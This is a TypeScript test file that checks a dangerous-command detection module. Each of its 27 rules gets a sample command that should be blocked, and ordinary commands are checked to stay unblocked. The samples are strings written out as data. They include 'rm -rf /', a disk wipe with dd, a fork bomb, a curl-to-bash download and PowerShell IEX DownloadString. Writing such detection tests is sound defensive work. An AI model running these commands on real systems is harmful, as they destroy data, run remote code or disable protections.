/**
 * issue #5（2026-10-29）：37 条危险命令规则的**负向复现样例**。
 *
 * 背景：`app/src/security/patterns/dangerousCommands.ts` 有 37 条规则
 * （`ALL_UNIFIED_RULES` 27 条 + 向后兼容的 `DANGEROUS_COMMAND_PATTERNS` 10 条），
 * 但仓内**没有任何测试引用这两份常量**（Grep `DANGEROUS_COMMAND_PATTERNS|ALL_UNIFIED_RULES`
 * 命中 11 个生产文件、0 个测试文件）⇒ 规则改错/漏改都无法被发现。
 *
 * 本用例的做法：给每条规则准备**一条应被拦截的输入**（纯字符串，**绝不执行**），
 * 断言「预期规则」确实在「实际命中规则集合」内；并在样例缺失时直接报红，
 * 从而对「新加规则没配样例」形成棘轮。
 *
 * 已知过宽（未在本用例中钉住，另行记录）：`format_volume` 的 `/\bformat\s+/i`
 * 会让 `npm run format`、`prettier --write` 之后带 `format ` 的正常命令命中 deny 级规则。
 */
import { describe, expect, it } from 'bun:test';
import {
  ALL_UNIFIED_RULES,
  DANGEROUS_COMMAND_PATTERNS,
} from '../../src/security/patterns/dangerousCommands';

/** 每条规则一条「应被拦截」的输入；字符串仅用于正则匹配，绝不执行 */
const SAMPLES: Array<{ rule: string; sample: string; platform: string }> = [
  // ── 删除类（7） ──────────────────────────────
  { rule: 'rm_root', sample: 'rm -rf /', platform: 'bash' },
  { rule: 'rm_force_recursive', sample: 'rm -rf *', platform: 'bash' },
  {
    rule: 'ps_recursive_deletion',
    sample: 'Remove-Item -Path C:\\temp\\cache -Recurse',
    platform: 'powershell',
  },
  {
    rule: 'ps_bulk_deletion',
    sample: 'Remove-Item -Force C:\\temp\\cache',
    platform: 'powershell',
  },
  {
    rule: 'ps_remove_item_generic',
    sample: 'Remove-Item report.txt',
    platform: 'powershell',
  },
  { rule: 'cmd_bulk_deletion', sample: 'del /s /q C:\\temp', platform: 'cmd' },
  {
    rule: 'permanent_deletion',
    sample: 'Remove-Item C:\\temp\\archive.zip',
    platform: 'powershell',
  },

  // ── 格式化（3） ──────────────────────────────
  { rule: 'mkfs', sample: 'mkfs.ext4 /dev/sdb1', platform: 'bash' },
  {
    rule: 'dd_device',
    sample: 'dd if=/dev/zero of=/dev/sda',
    platform: 'bash',
  },
  { rule: 'format_volume', sample: 'format C: /q', platform: 'bash' },

  // ── 提权（4） ────────────────────────────────
  { rule: 'chmod_777', sample: 'chmod -R 777 /var/www', platform: 'bash' },
  {
    rule: 'chown_recursive',
    sample: 'chown -R www-data /var/www',
    platform: 'bash',
  },
  { rule: 'userdel', sample: 'userdel testuser', platform: 'bash' },
  { rule: 'sudo_privilege', sample: 'sudo apt-get update', platform: 'bash' },

  // ── 系统（3） ────────────────────────────────
  { rule: 'shutdown', sample: 'shutdown -h now', platform: 'bash' },
  { rule: 'fork_bomb', sample: ':(){ :|: & };:', platform: 'bash' },
  { rule: 'iptables', sample: 'iptables -F', platform: 'bash' },

  // ── 注入 / 远程执行（3） ──────────────────────
  {
    rule: 'remote_download_exec',
    sample: 'curl -sL http://example.invalid/i.sh | bash',
    platform: 'bash',
  },
  {
    rule: 'base64_decode_exec',
    sample: 'base64 -d payload.b64 | sh',
    platform: 'bash',
  },
  {
    rule: 'iex_invoke',
    sample:
      'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a")',
    platform: 'powershell',
  },

  // ── 复合命令（7） ────────────────────────────
  {
    rule: 'pipe_remove_item',
    sample: 'Get-ChildItem C:\\temp | Remove-Item',
    platform: 'powershell',
  },
  {
    rule: 'foreach_remove_item',
    sample: 'Get-ChildItem | ForEach-Object { Remove-Item $_ }',
    platform: 'powershell',
  },
  {
    rule: 'invoke_command_remove',
    sample: 'Invoke-Command -ScriptBlock { Remove-Item C:\\temp\\x }',
    platform: 'powershell',
  },
  {
    rule: 'call_block_remove',
    sample: '& { Remove-Item C:\\temp\\x }',
    platform: 'powershell',
  },
  {
    rule: 'start_job_remove',
    sample: 'Start-Job -ScriptBlock { Remove-Item C:\\temp\\x }',
    platform: 'powershell',
  },
  {
    rule: 'iex_remove',
    sample: 'Invoke-Expression "Remove-Item C:\\temp\\x"',
    platform: 'powershell',
  },
  {
    rule: 'variable_remove',
    sample: 'Remove-Item $target',
    platform: 'powershell',
  },
];

/** 命中的统一规则名（保持声明顺序，便于断言输出可读） */
function unifiedHits(sample: string): string[] {
  return ALL_UNIFIED_RULES.filter((r) =>
    r.patterns.some((p) => p.test(sample))
  ).map((r) => r.name);
}

/** 命中的向后兼容规则名 */
function legacyHits(sample: string): string[] {
  return DANGEROUS_COMMAND_PATTERNS.filter((p) => p.pattern.test(sample)).map(
    (p) => p.name
  );
}

describe('危险命令规则：规模棘轮（issue #5 的「37 条」）', () => {
  it('统一规则 27 条 + 向后兼容 10 条 = 37 条', () => {
    expect(ALL_UNIFIED_RULES).toHaveLength(27);
    expect(DANGEROUS_COMMAND_PATTERNS).toHaveLength(10);
    expect(ALL_UNIFIED_RULES.length + DANGEROUS_COMMAND_PATTERNS.length).toBe(
      37
    );
  });

  it('规则名唯一（避免同名规则互相掩盖）', () => {
    const names = ALL_UNIFIED_RULES.map((r) => r.name);
    expect(new Set(names).size).toBe(names.length);
  });
});

describe('危险命令规则：每条规则都有可复现样例', () => {
  it('没有遗漏：ALL_UNIFIED_RULES 的每条规则都在样例表中', () => {
    const covered = new Set(SAMPLES.map((s) => s.rule));
    const missing = ALL_UNIFIED_RULES.map((r) => r.name).filter(
      (name) => !covered.has(name)
    );
    expect(missing).toEqual([]);
  });

  it('样例不引用不存在的规则名（防止改名后样例静默失效）', () => {
    const known = new Set(ALL_UNIFIED_RULES.map((r) => r.name));
    const unknown = SAMPLES.map((s) => s.rule).filter((n) => !known.has(n));
    expect(unknown).toEqual([]);
  });

  for (const item of SAMPLES) {
    it(`${item.rule}（${item.platform} 平台）能被自家规则拦截`, () => {
      expect(unifiedHits(item.sample)).toContain(item.rule);
    });
  }

  it('向后兼容的 10 条规则同样有样例命中', () => {
    for (const legacy of DANGEROUS_COMMAND_PATTERNS) {
      const hit = SAMPLES.some((s) => legacy.pattern.test(s.sample));
      expect(hit).toBe(true);
    }
  });
});

describe('危险命令规则：负向对照（正常命令不应被拦）', () => {
  const safeCommands = [
    'ls -la',
    'git status',
    'cat notes.txt',
    'bun test',
    'npm run build',
    'grep -rn TODO src',
  ];

  for (const cmd of safeCommands) {
    it(`正常命令零命中：${cmd}`, () => {
      expect(unifiedHits(cmd)).toEqual([]);
      expect(legacyHits(cmd)).toEqual([]);
    });
  }
});
